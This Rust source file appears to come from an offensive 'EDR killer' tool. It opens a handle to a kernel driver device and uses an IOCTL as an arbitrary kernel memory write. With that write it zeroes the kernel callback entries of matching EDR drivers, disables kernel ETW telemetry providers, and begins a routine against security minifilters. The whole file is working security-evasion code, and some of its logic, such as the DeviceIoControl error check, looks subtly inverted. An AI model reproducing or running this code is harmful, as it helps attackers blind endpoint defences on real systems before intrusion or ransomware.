use std::ffi::CString;
use std::process;
use std::ptr::null_mut;
use std::ptr;

use winapi::shared::ntdef::HANDLE;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE,
};
use winapi::um::ioapiset::DeviceIoControl;

use crate::mem::{self, write_qword};
use crate::km;
use crate::pdb;


/// Opens a handle to the device and returns it
pub fn get_driver_handle() -> Result<HANDLE, u32> {
    let cstr_device_name =
        CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");

    unsafe {
        let h_device = CreateFileA(
            cstr_device_name.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
            let err = GetLastError();
            eprintln!("[-] Failed to open handle to device. Error code: {}", err);
            Err(err)
        } else {
            Ok(h_device)
        }
    }
}


/// Sends an IOCTL to the driver
pub unsafe fn send_ioctl_to_driver(
    h_device: HANDLE,
    location_to_write_to: u64,
    size: u32,
) -> i32 {
    // Check if the handle is valid
    if h_device == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        eprintln!("[!] Error: invalid driver handle. GetLastError = {}", err);
        process::exit(-1);
    }

    // Input buffer is just the address you want to write to
    let input: u64 = location_to_write_to;
    let mut bytes_returned: u32 = 0;

    let success = unsafe {
        DeviceIoControl(
            h_device,
            0xCF532017, // IOCTL code
            &input as *const _ as *mut _, // input buffer
            size,                          // input buffer size
            location_to_write_to as *mut _,// output buffer = target memory
            size,                          // output buffer size
            &mut bytes_returned,
            ptr::null_mut(),
        )
    };

    if success != 0 {
        let err = unsafe { GetLastError() };
        eprintln!("[-] DeviceIoControl failed. GetLastError = {}", err);
        return -1;
    }

    success
}


/// Read & disable EDR callbacks
pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u64>> {
    println!("[>] Enumerating {} callback at: 0x{:16X}", cb_type, base_address);

    let result = Vec::with_capacity(0x40);

    for i in 0..0x40 {
        // Calculate the address for the i-th qword
        let addr = base_address + (i * std::mem::size_of::<u64>()) as u64;

        // Re-use your read_qword function
        let value = mem::read_qword(addr)?;
        if value != 0 {
            let func_addr = mem::read_qword(value & 0xfffffffffffffff8)?;
            let drv_name: String;
            match km::find_driver_name_from_addr(func_addr) {
                Some(drv) => {
                    drv_name = drv; // take ownership of the String
                },
                None => {
                    println!("[-] Could not find driver name for address 0x{:16X}", func_addr);
                    drv_name = String::from(""); // fallback
                }
            }
            println!(
                "[|]   [0x{:16X}]: 0x{:16X} [{}]",
                addr, func_addr, drv_name
            );
            if km::is_driver_name_matching_edr(&drv_name) {
                println!("[|]                `------> Entry matches EDR ({}). Removing...", drv_name);
                write_qword(addr, 0x00);
            }
        }
    }

    Ok(result)
}


/// Read & disable a km ETW provider
pub fn nerf_etw_prov(
    prov_addr: u64, prov_name: &str, guid_offset: u64, prov_offset: u64
) -> windows::core::Result<u64> {
    println!("[>] Checking ETW provider {} at: 0x{:16X}", prov_name, prov_addr);

    let reg_entry = mem::read_qword(prov_addr)?;
    let guid_entry = mem::read_qword(reg_entry + guid_offset)?;
    let mut enable_info = mem::read_dword(guid_entry + prov_offset)?;

    if enable_info == 0x1 {
        println!("[*] Current {} provider enabled status: 0x{:x}. Disabling!", prov_name, enable_info);
        mem::write_dword(guid_entry + prov_offset, 0x0);
        enable_info = mem::read_dword(guid_entry + prov_offset)?;
    } else if enable_info > 0x1 {
        println!("[-] Error: {} provider is neither 0 or 1 (status: 0x{:x})", prov_name, enable_info);
    }

    Ok(enable_info as u64) // wrap the success in Ok()
}


/// Read & disable an EDR file system minifilter
/// pub struct FmOffsets {
///     pub flt_globals: u64,
///     pub globals_framelist: u64,
///     pub flt_resource_list_head_rlist: u64,
///     pub fltp_frame_links: u64,
///     pub fltp_frame_registeredfilters: u64,
///     pub flt_object_primarylink: u64,
///     pub flt_filter_driverobject: u64,
///     pub flt_filter_instancelist: u64,
///     pub driver_object_driverinit: u64,
///     pub flt_instance_callbacknodes: u64,
///     pub flt_instance_filterlink: u64
/// }  
///
pub fn nerf_fs_miniflts(fm_offsets: pdb::FmOffsets) -> windows::core::Result<()> {
    println!("[|] FltGlobals offset: 0x{:x}", fm_offsets.flt_globals);
    
    Ok(())
}